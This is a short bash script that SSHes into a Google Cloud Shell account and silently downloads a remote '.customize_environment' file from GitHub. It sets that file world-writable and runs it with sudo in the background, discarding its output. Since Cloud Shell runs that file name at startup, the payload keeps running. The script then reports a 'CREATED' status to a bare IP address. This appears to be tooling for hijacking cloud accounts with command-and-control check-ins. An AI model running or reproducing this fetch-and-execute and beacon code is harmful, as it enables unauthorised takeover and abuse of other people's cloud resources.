#!/bin/bash

user=${0##*/}

echo
echo $1

command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"

gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet

url='http://135.148.11.148/send_status.php?refresh='$2'&status=CREATED&owner='$user
curl $url

echo 'command ok'
